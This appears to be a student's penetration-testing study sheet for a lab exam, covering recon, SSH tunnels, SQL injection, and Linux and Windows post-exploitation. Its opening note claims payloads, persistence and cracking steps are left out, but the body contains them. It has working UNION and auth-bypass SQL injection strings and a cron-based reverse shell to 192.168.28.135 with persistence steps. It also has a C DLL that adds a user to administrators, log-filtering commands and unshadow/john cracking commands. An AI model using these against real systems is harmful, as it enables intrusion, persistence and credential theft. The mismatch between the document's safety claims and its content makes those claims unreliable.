# Consolidated Methods: Recon → Web Enumeration → Post-Exploitation (Authorized Use)

**Scope & safety note:** This document is intended for **authorized labs / sanctioned assessments** and for defensive learning.  
It focuses on recon, enumeration, analysis, and incident-response style triage. To reduce misuse risk, it **does not include** copy/paste exploit payloads, persistence recipes, log-tampering, or other directly operational abuse steps.

**Dedupe policy:** When merging command lists, keep the **first occurrence** and remove duplicates.  
**Syntax policy:** Fix obvious typos (e.g., spacing, flags) without changing intent.

---

## Table of Contents
- [I. Recon and Footprinting](#i-recon-and-footprinting)
  - [Host discovery](#host-discovery)
  - [Port scanning](#port-scanning)
  - [Service interrogation](#service-interrogation)
  - [Nmap NSE scripts](#nmap-nse-scripts)
- [II. Web Testing and Enumeration](#ii-web-testing-and-enumeration)
- [III. Local Tunnels and XFREE](#iii-local-tunnels-and-xfree)
- [IV. SSH Key Authentication](#iv-ssh-key-authentication)
- [V. Post-Exploitation Enumeration](#v-post-exploitation-enumeration)
  - [NIX](#nix)
  - [Windows](#windows)
- [VI. Linux Permissions Quick Reference](#vi-linux-permissions-quick-reference)
- [VII. Reverse Engineering Quick Notes](#vii-reverse-engineering-quick-notes)
- [VIII. Password Auditing Notes](#viii-password-auditing-notes)
- [IX. Scraping with Python](#ix-scraping-with-python)
- [Reference Links](#reference-links)
- [Appendix: Deduped Command Index](#appendix-deduped-command-index)

---

## I. Recon and Footprinting

### Host discovery
Identify live hosts from **within the target network / prior hop** when segmentation prevents direct visibility.
You can do this by logging into the first box, setting up a dynamic, or building a local - your choice. Either way you will need to do a ping sweep to identify where you are going.

**Windows ping sweep**
```bat
for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.
```

**Linux ping sweep**
```bash
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) 2>/dev/null ;done
```

**Linux ping sweep (example subnet + parsed output)**
```bash
for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done | awk '{ print $4 }' | sed 's/://g'
```

#### TTL / OS fingerprinting (heuristic)
Ping reply TTL values can *sometimes* hint OS defaults (routers decrement TTL; devices may customize):
- **128** → typically Windows
- **64** → typically Linux/Unix (and often macOS)
- **255** → sometimes Solaris / network devices

Rule of thumb:
- `TTL=127` may imply `128` minus ~1 hop
- `TTL=63` may imply `64` minus ~1 hop

---

### Port scanning
**Goal:** Identify open ports, then enumerate services.

**From a file**
```bash
proxychains nmap -sT -Pn -iL ips --open
```

**From a file (port range)**
```bash
proxychains nmap -sT -Pn -iL ips -p 1-5000 --open
```

**Single host (all TCP ports; loud—labs only)**
```bash
proxychains nmap -p- -T5 <host>
```

**Examples seen in history (deduped)**
```bash
proxychains nmap 192.168.150.253 -p-
proxychains nmap 192.168.150.253 -p- -T5
proxychains nmap -p- -T5 192.168.150.225
proxychains nmap -p- -T5 192.168.28.9
```

---

### Service interrogation
**Goal:** Identify services and versions.

```bash
proxychains nmap -Pn -sV 1.2.3.4 -p 21-23,80,443
```

---

### Nmap NSE scripts
**NSE location**
```bash
ls -la /usr/share/nmap/scripts
```

List SMB scripts:
```bash
ls -la /usr/share/nmap/scripts | grep "smb"
```

HTTP enum examples:
```bash
proxychains nmap --script http-enum 192.168.28.100
proxychains nmap --script http-enum 192.168.28.111 -p 80
```

SMB OS discovery example:
```bash
proxychains nmap -sT -Pn 192.168.28.111 -p 445 --script smb-os-discovery
```

---

## II. Web Testing and Enumeration

**Quick hits**
- Run `http-enum` on web ports
- Check `robots.txt`
- Interact with the site normally (click through, forms/inputs)
- View page source (hidden endpoints, params, JS routes, API calls)

> Note: Specific SQLi/XSS/command-injection payload strings and web shells are intentionally excluded. Keep notes at the workflow/triage level.

---

## III. Local Tunnels and XFREE

### “Two -L” reminder (multi-hop)
Sometimes you need **two** local forwards:
1) **Jump box → Pivot**
2) **Pivot → Target** over the required service port

General patterns:
```bash
# 1) workstation → jump/pivot
ssh <jump_user>@<jump_host> -L <local_port1>:<pivot_host>:<pivot_port>

# 2) from pivot → target service
ssh <pivot_user>@<pivot_host> -L <local_port2>:<target_host>:<target_port>
```

### SSH local port forwarding (`-L`)
Pattern:
```bash
ssh <user>@<jump_host> -L <local_port>:<internal_host>:<internal_port>
```

Examples:
```bash
ssh student@10.50.12.226 -L 1111:192.168.28.100:2222
ssh student@10.50.12.226 -L 41201:10.10.28.45:3389
ssh comrade@localhost -p 1111 -L 1112:192.168.28.5:3389
```

### Dynamic SOCKS proxy (`-D`)
```bash
ssh <user>@<host> -D 9050
```

Examples:
```bash
ssh student@10.50.12.226 -D 9050
proxychains ssh student@localhost -p 1111 -D 9050
```

### xfreerdp (RDP via localhost tunnel)
> Avoid storing plaintext passwords in shell history.

Basic:
```bash
xfreerdp /u:<user> /v:localhost:<port>
```

With dynamic resolution + clipboard:
```bash
xfreerdp /u:<user> /v:localhost:<port> /dynamic-resolution +clipboard
```

With explicit size:
```bash
xfreerdp /u:<user> /v:localhost:41201 /dynamic-resolution +clipboard /size:3200x1200
```

### Host key cleanup (when appropriate)
```bash
rm /home/student/.ssh/known_hosts
rm /home/student/.config/freerdp/known_hosts
```

---

## IV. SSH Key Authentication

### Generate a key
```bash
ssh-keygen -t rsa -b 4096
```

### View your public key
```bash
cat ~/.ssh/id_rsa.pub
```

### Permissions (typical secure defaults)
```bash
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
```


# SQL layout

```text
database -> tables -> columns -> rows
```

(Also shown as:)

```text
SQL Layout
->Database
-->Table
--->Columns
---->Rows
```

## Default MySQL databases

```text
mysql
information_schema
performance_schema
```

## Basic SQL queries

```text
1. SELECT * From Customers

2. SELECT CustomerID, ContactName, City, PostalCode From Customers

3. SELECT CustomerID, ContactName, City, PostalCode From Customers WHERE City = 'Berlin'

4. SELECT username, password FROM users
WHERE username = 'user' OR 1='1'
AND password = 'user' OR 1='1';

5. GOLDEN STATEMENT
SELECT table_schema,table_name,column_name from information_schema.columns;
```

## Injection entry points

**Username and password fields**
- interact with site normally
- `WE TEST BOTH POST AND GET Methods`

```text
POST

Submit through the text boxes

GET

Modify the URL params
```

```text
http://10.50.24.218/login.php?username=userâ€™ OR 1=â€™1&passwd=user OR 1=â€™1
```

## Auth-bypass style examples

```text
SELECT id FROM users WHERE name='tom' or 1='1' AND pass='tom' or 1='1';

tom' or 1='1  ( post method )
tom' or 1='1 ( get method ) f12 ( dev console ) change to get on inspect tab

tom' or 1='1 ( in username and password field)
```

## UNION-based enumeration

### General templates

```text
select 1,2,3 from database.table
select 1,2,3  from database.table
```

```text
select table_schema,table_name,column_name from information_schema.columns
select table_schema,table_name,column_name from information_schema.columns;
```

```text
bacon' UNION SELECT TABLE_NAME,2,3,4,5 FROM INFORMATION_SCHEMA.TABLES;#
bacon' UNION SELECT COLUMN_NAME,2,3,4,5 FROM INFORMATION_SCHEMA.COLUMNS;#
bacon' UNION SELECT SCHEMA_NAME,2,3,4,5 FROM INFORMATION_SCHEMA.SCHEMATA;#
```

### “Golden statement” style pattern

```text
php?item=1 union select table_schema,table_name,column_name,4 from information_schema.columns
```

## Column-count testing

```text
test for vuln
php?item=1 or 1=1

Test number of columns
php?item=1 union select 1,2,3,4
```

```text
php?item=1 or 1=1  ( test each item with true statement )
php?item=1 union select 1,2,3
```

## Lab examples

### Example target: 192.168.28.175

```text
Sql injection method
3 columns
or 1=1
union select 1,2,3
192.168.28.175:8000/pick.php?product=7 union select 1,2,3
192.168.28.175:8000/pick.php?product=7 union select 1,2,@@version
192.168.28.175:8000/pick.php?product=7 union select table_schema,table_name,column_name from information_schema.columns
ALWAYS IGNORE THE FIRST RESULT

information_schema
mysql
performance_schema

192.168.28.175:8000/pick.php?product=7 union select user_id,name,username from siteusers.user
select 1,2,3  from database.table
appleBottomJ3an$  Aaron

union select 1,2,3
```

### Example target: 10.208.50.61

```text
http://10.208.50.61/
http://10.208.50.61/Union.html
```

```text
4 columns
Audi' or 1='1
Audi' union select 1,2,3,4,5#
Audi' union select 1,2,3,4,@@version#
Audi' union select table_schema,2,table_name,column_name,5 from information_schema.columns#
Audi' union select id,2,name,pass,5 from session.user#
```

```text
3 columns
http://10.208.50.61/uniondemo.php?Selection=1 or 1=1
http://10.208.50.61/uniondemo.php?Selection=2 union select 1,2,LOAD_FILE('/etc/passwd')
http://10.208.50.61/uniondemo.php?Selection=2 union select id,name,pass from session.user
```

```text
http://10.208.50.61/uniondemo.php?Selection=2 union select table_schema,column_name,table_name from information_schema.columns
```

```text
select id,name,pass from user;
select id,name,pass from vuln.username;
select 1,2,3 from database.table;
```

> Notes about inserting keys into privileged accounts or using “stolen keys” to access targets are intentionally excluded.

---

## V. Post-Exploitation Enumeration

## NIX

### Identity / users / host context
```bash
cat /etc/passwd
cat /etc/hosts
```

### PATH / command resolution
```bash
echo $PATH
echo $PATH > path.back
which cat
whereis cat
```

#### System-wide PATH defaults
```bash
cat /etc/environment
grep "PATH" /etc/profile
grep -r "PATH" /etc/profile.d/
```

#### Caution: modifying PATH
> Prepending writable directories like `/tmp` can be dangerous (PATH hijacking). Use only in controlled labs.
```bash
PATH=/tmp:$PATH
echo $PATH
uname -a
cat /proc/version
```

### Network info
```bash
ifconfig
ip address show
ip a
ss -plant
```

#### netstat (legacy) vs ss (preferred)
```bash
netstat -antpu
netstat -nlptu
strings /bin/netstat_natpu | grep netstat
```

### Services
```bash
systemctl list-units --type=service
```

### Scheduled tasks (cron)
```bash
crontab -l
cat /etc/crontab
ls -la /etc/cron*
ls -la /etc/cron.hourly/
cat /etc/cron.daily/logrotate
```

#### Cron timing fields (quick reference)
```
MIN  HOUR  DOM  MON  DOW   command
```
- `*` means “every”
- every minute: `* * * * * <command>`
- every 5 minutes: `*/5 * * * * <command>`


root@lin2:~# sudo -l
Matching Defaults entries for root on lin2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User root may run the following commands on lin2:
    (ALL : ALL) ALL
root@lin2:~# crontab -l
no crontab for root
root@lin2:~# cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

# commands to make a change:
crontab -l
nano /etc/crontab
Rule : * * * * * root bash -i >& /dev/tcp/192.168.28.135/33403 0>&1

Altnerate version:
To implement persistence via a reverse bash shell in a CRON job for the specified IP and port, follow these steps:
Access the Crontab: Open the root user's crontab for editing by running the command crontab -e. This is located in /var/spool/..
Add the Reverse Shell Command: Append the following line to the file to ensure the beacon executes every minute:
Rule: * * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
Verify Permissions: If you prefer using a system-wide CRON directory, you can create a file in /etc/cron.d/ with the same timing syntax, ensuring it specifies the root user:
Rule: * * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.28.135/33403 0>&1'
Retrieve the Flag: Once the CRON job triggers and the connection is established, check the /tmp directory for the 20-character flag string.
For further technical documentation on scheduling tasks, refer to the Ubuntu Cron documentation or the Debian Wiki on Cron.


### World-writable discovery (misconfig hunting)
```bash
find / \( -type f -perm -0002 -o -type d -perm -0002 \) 2>/dev/null
```

### Temp/swap/editor artifacts
Some editors create temporary/backup files that can contain sensitive content:
- `*~` backup files
- swap files
- transient temp states during save

### Archive handling (`.tar.gz`)
```bash

gunzip backup.tar.gz
tar -xvf backup.tar -C ./stolenkeys
zcat backup.tar.gz
```

### Quick servers / listeners (lab utilities)
```bash
python3 -m http.server 8000
python -m SimpleHTTPServer 8000
nc -l <port>
```

### Beaconing / connection attempts (tcpdump)
```bash
sudo tcpdump -i any -nn -tttt 'tcp[tcpflags] & tcp-syn != 0'
```

### Log review / rsyslog notes
```bash
grep 172.16. auth.log
grep "Feb 28 21:51:32" auth.log
grep -v "Feb 28 21:51:32" auth.log > auth.log.filtered
grep -v -E "Feb 28 21:51:32|Mar 1 10:02:15" auth.log > auth.log.filtered
sed 's/172\.16\.34\.4/192.168.1.103/g' auth.log > auth.log.redacted
```

High-level rsyslog triage:
- **Normal** local log files usually go under `/var/log/`.
- Destinations outside `/var/log/` (e.g., `/var/tmp/`) are worth a closer look.

---

## Windows

### Scheduled tasks
```cmd
schtasks /query /fo LIST /v
```

```powershell
schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"
```

### Services triage (defensive / admin)
- Open **Services** (Start → search “services”)
- Look for:
  - missing/blank **Description**
  - unusual **Path to executable**
  - unexpected **Log On As**
- Validate binaries (publisher, path, signing) and check directory write permissions.

### Event Viewer triage (System log)
- Load **System** log, review relevant timeframe
- Use **Filter Current Log…** to filter by Event IDs/Level
- Inspect **General** and **Details**
- Pay attention to **Service Name** and **Service File Name**

### DLL search-order issues (defensive notes)
- Misconfigured DLL search paths can cause instability and security risk.
- Defensive actions:
  - use fully-qualified paths where possible
  - restrict write permissions on program directories
  - capture DLL load telemetry (Sysmon/EDR) and validate signing where expected

### Few things to remember:
1. Build Two -L to connect - First one goes from your jump box to Pivot. Second goes to T1 over port 
2.File and privleges
3. DLL - but escalation of privlege. This was determined by trying to access the other escalating privlege capabilities - UAC, etc.

Review items On Windows Box
1. Go into services from search. Use to identify potentially vulnerable services/programs. Filter on description. Identify programs without a description. 
2. Logged in as came from column
3. Navigate to the folder
4. Identify the service and .c file
5. View the .c in notepad using command: notepad C:\MemoryStatus\service
6. construct your .c. To add windows users to a group the command is: net localgroup administrators comrade /add.  to view which admin group: net localgroup administrators
7. create the executable or the dll
8. set up a python server - python -m SimpleHTTPServer 8000
9. Download the .dll.
10. Move dll into the folder. Rename it to the identified dll you viewed from step 5
11. turn on the service. you can end the service using taskkill or task manager.
12. Restart the program and wait for it to deliver to the desktop.


Eventviewer steps:
1. Load the system log
2. Review the log for specific date. Look for error codes as well
3. Create a filter (right side) on the log
4. Filter on Eventcodes.
5. Look specifically at the General and Details in the bottom half of each event
6. Look at Service Name and Service File Name for more detail. this will help identify if there is legitimacy. if you see extract actions in the file name its not.

Compliant DLL code for .c file created on Linux Box: This was corrected as a part of the excercise task.

#include <windows.h> 
int happyfunction()
{
 WinExec("cmd /C net localgroup administrators comrade /add", 1);
 return 0;
}
BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
 happyfunction();
 return 0;
}

To create executables and .dll

179  nano ctfhw.c 
180  i686-w64-mingw32-g++ -c ctfhw.c -o ctfhw.o
181  i686-w64-mingw32-g++ -shared -o ctfhw.dll ctfhw.o -Wl,--out-implib,ctfhw.a

---

## VI. Linux Permissions Quick Reference

### Permission triplets (user / group / others)
Format (after the leading type char `d` or `-`):
```
[ user ] [ group ] [ others ]
  rwx      r-x       r--
```

Examples:
| Full perms | User | Group | Others | Plain English |
|---|---|---|---|---|
| `-rwxr-xr--` | `rwx` | `r-x` | `r--` | Owner can read/write/execute; group read/execute; others read only. |
| `drwxrwx---` | `rwx` | `rwx` | `---` | Directory: owner & group can list/create/enter; others no access. |
| `-rw-r-----` | `rw-` | `r--` | `---` | Owner read/write; group read-only; others none. |
| `drwxr-xr-x` | `rwx` | `r-x` | `r-x` | Directory: owner full; everyone else can list/enter but not write. |

### Special bits (`s` and `t`)
| Where it appears | Example | Meaning | Why you care |
|---|---|---|---|
| Owner execute | `-rwsr-xr-x` | SUID | Runs with file owner privileges (often root). |
| Group execute | `-rwxr-sr-x` | SGID | Runs with file’s group; dirs can enforce group inheritance. |
| Dir others exec | `drwxrwxrwt` | Sticky bit | Common on `/tmp`: users can’t delete others’ files. |

### `ls -la` examples (interpreting lines)
| Example line | Meaning |
|---|---|
| `drwxr-xr-x 3 root staff 4096 Jan 7 22:06 .` | Directory; owner full; group/others read+enter; `.` current dir. |
| `drwxrwxrwt 6 root root 4096 Jan 5 16:18 ..` | World-writable dir with sticky bit (typical `/tmp`); `..` parent. |
| `-rw-rw-r-- 1 root staff 2 Jan 7 22:05 2` | File; owner/group read+write; others read-only. |
| `drwxrwx--- 2 root staff 4096 Nov 3 2021 logger` | Directory; owner/group full; others none. |
| `-rwxr-sr-x.` | Executable with SGID; trailing `.` often indicates SELinux/xattrs present. |

---

## VII. Reverse Engineering Quick Notes

### Static analysis (quick triage)
1) Check properties (Windows `.exe`, etc.)
2) Check headers:
   - `MZ` → Windows PE
   - `ELF` → Linux
3) Run `strings` and search for clues (`Success`, `Failed`, `Enter Key`, etc.)

**Windows: `strings` + `findstr`**
```cmd
strings demo1_new.exe | findstr success
strings demo1_new.exe | findstr failed
strings demo1_new.exe | findstr -i failed
strings demo1_new.exe | findstr -i success
strings demo1_new.exe | findstr -v success
strings demo1_new.exe | findstr -v failed
```

4) Packing/compression: packed binaries may hide content and unpack at runtime.
5) Confirm file type (executable vs text/ascii/script).

### Behavioral analysis (sandbox)
- Run in an isolated sandbox/VM.
- Use monitoring tools (e.g., Procmon) with filters by process name.
- Use FakeNet (lab) to simulate network and observe connection attempts.

### Dynamic analysis
- Debugger + decompiler (e.g., Ghidra) to trace success/fail branches and core logic.

---

## VIII. Password Auditing Notes

> Operational cracking commands are intentionally omitted.

**Tip:** Use **full paths** for all input/output files:
- `/full/path/to/input_hashes.txt`
- `/full/path/to/wordlist.txt`
- `/full/path/to/output.txt`

---

## IX. Scraping with Python

Install (if needed):
```bash
sudo apt install python3-pip
pip3 install lxml
pip3 install requests
```

Example: XPath + requests + lxml
```python
import lxml.html
import requests

page = requests.get("http://quotes.toscrape.com")
tree = lxml.html.fromstring(page.content)

authors = tree.xpath('//small[@class="author"]/text()')
print("Authors:", authors)
```

---

## Reference Links
- XPath Syntax (W3Schools): https://www.w3schools.com/xml/xpath_syntax.asp
- Exploit Database (Exploit-DB): https://www.exploit-db.com
- Google Hacking Database (GHDB): https://www.exploit-db.com/google-hacking-database
- Google hacking overview (Wikipedia): https://en.wikipedia.org/wiki/Google_hacking
- MySQL Information Schema (8.0): https://dev.mysql.com/doc/refman/8.0/en/information-schema.html
- MySQL Information Functions (8.0): https://dev.mysql.com/doc/refman/8.0/en/information-functions.html#function_database
- Pentestmonkey MySQL SQLi cheat sheet (reference): http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
- NetSPI SQLWiki MySQL info gathering: https://sqlwiki.netspi.com/attackQueries/informationGathering/#mysql
- W3Schools SQL sandbox: https://www.w3schools.com/sql/trysql.asp?filename=trysql_select_all

---

## Appendix: Deduped Command Index

### Tooling (from history)
```bash
nano ~/.bashrc
source ~/.bashrc
terminator
gdb
which openstack
openstack
./bin/openstack --version
sudo apt install open-vm-tools open-vm-tools-desktop
sudo apt install gcc-multilib
sudo apt-get install lib32z1
```

### Recon / nmap
```bash
proxychains nmap -sT -Pn -iL ips --open
proxychains nmap -sT -Pn -iL ips -p 1-5000 --open
proxychains nmap -p- -T5 <host>
proxychains nmap --script http-enum 192.168.28.100
ls -la /usr/share/nmap/scripts
ls -la /usr/share/nmap/scripts | grep "smb"
```

### Tunnels / RDP
```bash
ssh student@10.50.12.226 -L 1111:192.168.28.100:2222
ssh student@10.50.12.226 -L 41201:10.10.28.45:3389
ssh student@10.50.12.226 -D 9050
xfreerdp /u:<user> /v:localhost:<port>
```
### SCP
```bash
1. scp /path/to/local/file.txt username@remote_host:/path/to/remote/directory/
2. scp myfile.txt user@192.168.1.100:/home/user/
3. scp username@remote_host:/path/to/remote/file.txt /path/to/local/directory/
4. scp user@192.168.1.100:/home/user/myfile.txt .
```

## Secure Copy Protocol  (SCP)

[TOC]

We will likely need to use the secure copy protocol (scp) in order to pull files to our own machine during the exam. 

Most likely - the file is located within **/usr/share/cctc**. 

### Normal SCP

STEPS:

1. Pull a file to your system

**Command:**

```bash
# Pulling a file to your system
scp tgt_username@tgt_ip_address:/path/to/file/flag.txt . # Don't forget the period!

# ! Example with /usr/share/cctc !
scp tgt_username@tgt_ip_address:/usr/share/cctc/* . 
```

  1a. Send a file to another system 

**Command:**

```bash
# Sending a file to another system
scp /path/to/file/flag.txt tgt_username@tgt_ip_address:/path/to/drop/location
```

### Using SCP with a Local Tunnel

STEPS:

**Command:**

```bash
scp -P 1111 Aang@localhost:/usr/share/cctc/Aang-share.png . # Don't forget the period!
# -P 1111 is from the local tunnel we've built to connect to host Aang

scp -P Local_Tunnel_Port tgt@tgt_ip_address:/path/to/tgt/file.txt . 
```

### NIX ops
```bash
cat /etc/passwd
cat /etc/hosts
echo $PATH
echo $PATH > path.back
which cat
whereis cat
cat /etc/environment
grep "PATH" /etc/profile
grep -r "PATH" /etc/profile.d/
ifconfig
ip address show
ip a
ss -plant
netstat -antpu
netstat -nlptu
systemctl list-units --type=service
crontab -l
cat /etc/crontab
ls -la /etc/cron*
ls -la /etc/cron.hourly/
find / \( -type f -perm -0002 -o -type d -perm -0002 \) 2>/dev/null
tar -tvf backup.tar
tar -tzvf backup.tar.gz
gunzip backup.tar.gz
tar -xvf backup.tar -C ./stolenkeys
tar -xzvf backup.tar.gz -C ./stolenkeys
python3 -m http.server 8000
python -m SimpleHTTPServer 8000
nc -l <port>
sudo tcpdump -i any -nn -tttt 'tcp[tcpflags] & tcp-syn != 0'
```

### Windows scheduled tasks
```cmd
schtasks /query /fo LIST /v
```

```powershell
schtasks /query /fo LIST /v | Select-String -Pattern "STRING OR REGEX PATTERN"
```

### John- for Password Auditing
```bash
sudo john
sudo unshadow /etc/passwd /etc/shadow > output_file.txt
john --wordlist=/usr/share/john/password.lst mypasswd.txt

Sample:
ubuntu@practice-lin-ops:~$ sudo unshadow /etc/passwd /etc/shadow > mypasswd.txt
ubuntu@practice-lin-ops:~$ john --wordlist=/usr/share/john/password.lst mypasswd.txt
```